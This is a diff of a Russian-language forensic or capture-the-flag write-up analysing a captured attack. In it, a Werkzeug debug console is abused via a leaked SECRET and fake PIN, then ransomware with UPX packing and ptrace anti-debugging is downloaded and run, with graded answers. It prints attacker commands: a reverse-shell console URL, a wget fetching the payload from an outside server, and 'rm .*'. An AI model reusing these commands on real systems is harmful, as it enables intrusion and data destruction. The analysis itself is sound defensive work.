@@ -8,7 +8,7 @@
 
 - 1. Как был получен первичный доступ к системе? (2 балла)
 
-# Ответ 1
+# Ответ 1 (2/2)
 
 ### Открытие консоли (пакет 565-566) спустя 11 секунд после открытия главной страницы сайта:
 
@@ -22,6 +22,70 @@ http://10.10.10.3:5000/console?&__debugger__=yes&cmd=import%20socket%2Csubproces
 root@7a5a67189bc9:/app#
 ```
 
+### Получение секрета фласка (Пакет 577 (22:33:21) ):
+```
+<!doctype html>
+<html lang=en>
+  <head>
+    <title>Console // Werkzeug Debugger</title>
+    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
+    <link rel="shortcut icon"
+        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
+    <script>
+      var CONSOLE_MODE = true,
+          EVALEX = true,
+          EVALEX_TRUSTED = false,
+          SECRET = "yqqPfQiFZmXsmnZQYMPF";
+    </script>
+  </head>
+  <body style="background-color: #fff">
+    <div class="debugger">
+<h1>Interactive Console</h1>
+<div class="explanation">
+In this console you can execute Python expressions in the context of the
+application.  The initial namespace was created by the debugger automatically.
+</div>
+<div class="console"><div class="inner">The Console requires JavaScript.</div></div>
+      <div class="footer">
+        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
+        friendly Werkzeug powered traceback interpreter.
+      </div>
+    </div>
+
+    <div class="pin-prompt">
+      <div class="inner">
+        <h3>Console Locked</h3>
+        <p>
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        <form>
+          <p>PIN:
+            <input type=text name=pin size=14>
+            <input type=submit name=btn value="Confirm Pin">
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
+```
+
+Далее эта же строка в параметре s= в 172.18.0.3:5000/console используется для входа в python консоль вместе с муляжом пин-кода (Пакет 693 (22:33:24) ):
+
+```
+GET /console?__debugger__=yes&cmd=pinauth&pin=123-456-789&s=yqqPfQiFZmXsmnZQYMPF HTTP/1.1
+Host: 10.10.10.3:5000
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.3:5000/console
+Connection: keep-alive
+Cookie: hide-dotfile=no
+Priority: u=0
+```
+
 ---
 
 # Условие 2
@@ -30,11 +94,15 @@ root@7a5a67189bc9:/app#
 
 - 2. С каких IP-адресов поступала полезная нагрузка? (2 балла)
 
-# Ответ 2
+# Ответ 2 (2/2)
 
 Атака с `10.10.10.12` через `10.10.10.3`
 
-С сервера `81.177.221.242` было скачано приложение-шифровальщик `app`
+С сервера `81.177.221.242` было скачано приложение-шифровальщик `app` (пакет 1031 (22:35:19))
+
+```
+wget http://81.177.221.242:8125/app
+```
 
 ---
 
@@ -44,7 +112,9 @@ root@7a5a67189bc9:/app#
 
 - 3. Какие механизмы защиты от детектирования применены в вредоносном приложении? (4/8 баллов)
 
-# Ответ 3
+# Ответ 3 (8/8)
+
+### Пакет (ответ атакующему из реверс шелла) 1433 (Jan 22 22:35:52)
 
 ```
 CUSTOM_write found, patched.
@@ -55,6 +125,53 @@ Runtime-patching чтобы использовать CUSTOM_write() вместо
 
 По аналогии с [linux-anti-debugging](https://github.com/tobyxdd/linux-anti-debugging/tree/master)
 
+## Обновление
+
+`strings ./app` содержит следующий текст:
+
+```
+H
+PROT_EXEC|PROT_WRITE failed.
+_j<X
+$Info: This file is packed with the t
+Z executable packer http://upx.sf.net $
+$Id: t
+Z 4.24 Copyright (C) 1996-2024 the t
+Z Team. All Rights Reserved. $
+_RPWQM)
+j"AZR^j
+PZS^
+/proc/self/exe
+```
+
+Это значит, что приложение было сжато (что тоже защищает от обнаружения) при помощи программы [upx](http://upx.sf.net), хотя через `upx -d ./app` распаковать у меня не вышло
+
+`strace ./app` содержит много примерно одинаковых строчек:
+
+```
+wait4(4824, [{WIFSTOPPED(s) && WSTOPSIG(s) == SIGTRAP}], 0, NULL) = 4824
+ptrace(PTRACE_SYSCALL, 4824, NULL, 0)   = 0
+--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=4824, si_uid=1001, si_status=SIGTRAP, si_utime=0, si_stime=0} ---
+```
+
+Это значит, что приложение использует `ptrace` как и в приведенном аналоге
+
+Под конец:
+```
+ptrace(PTRACE_SYSCALL, 4824, NULL, 0Encrypting .//somefold/somefile: Encrypting .//app: )   = 0
+...
+write(1, "CUSTOM_write found, patched.\nCUS"..., 58CUSTOM_write found, patched.
+CUSTOM_write found, patched.
+) = 58
+exit_group(0)                           = ?
++++ exited with 0 +++
+```
+И несколько раз отвечает
+```
+ptrace(PTRACE_SYSCALL, 4824, NULL, 0ok
+)   = 0
+```
+
 ---
 
 # Условие 4
@@ -63,13 +180,13 @@ Runtime-patching чтобы использовать CUSTOM_write() вместо
 
 - 4. В какое время было начато исполнение вредоносной нагрузки? (13 баллов)
 
-# Ответ 4
+# Ответ 4 (13/13)
 
 Примерно с пакета 945 (Jan 22 22:34:49) (с удаления всех файлов в домашней директории):
 ```
 rm .*
 ```
-Вредоносное приложение было запущено с пакета 1426 (Jan 22 22:35:52):
+Вредоносное приложение было **запущено** с пакета 1426 (Jan 22 22:35:52):
 ```
 cd ..
 wget http://81.177.221.242:8125/app
@@ -85,7 +202,7 @@ chmod +x ./app
 
 - 5. Какая строчка была использована в качестве SECRET поля для уязвимого сервиса? (20 баллов)
 
-# Ответ 5
+# Ответ 5 (0/20)
 
 ### Пакет 577 (22:33:21):
 ```
@@ -159,11 +276,11 @@ Priority: u=0
 
 - 6. Опишите принцип работы и тип вредоносной нагрузки? (20 баллов)
 
-# Ответ 6
+# Ответ 6 (2/20)
 
 Вручную удалены все файлы из домашнего каталога через `rm .*`
 
-Все что осталось было зашифровано (то есть веб приложение) с помощью скачанного через `wget` приложения `app`
+Все что осталось было зашифровано с помощью скачанного через `wget` приложения `app`
 
 ### Принцип работы `app`:
 
@@ -253,3 +370,20 @@ Encrypting .//app: Encrypting .//ioal/app/docker-compose.yml: Encrypting .//ioal
 ```
 
 Тип вредоноса: Шифровальщик или шифровальщик-вымогатель (ransomware)
+
+## Обновление
+
+### Принцип работы обфускации ptrace
+
+Программа запускает себя же через ptrace и меняет `CUSTOM_write()` на `write()` чтобы записывать файлы
+
+### Шифрование
+
+Через hexdump видно что начало всех зашифрованных файлов содержит:
+
+```hex
+beef dead bade c0fe
+```
+
+Это означает, что программа шифрует файлы по своему (не стандартному) алгоритму
+
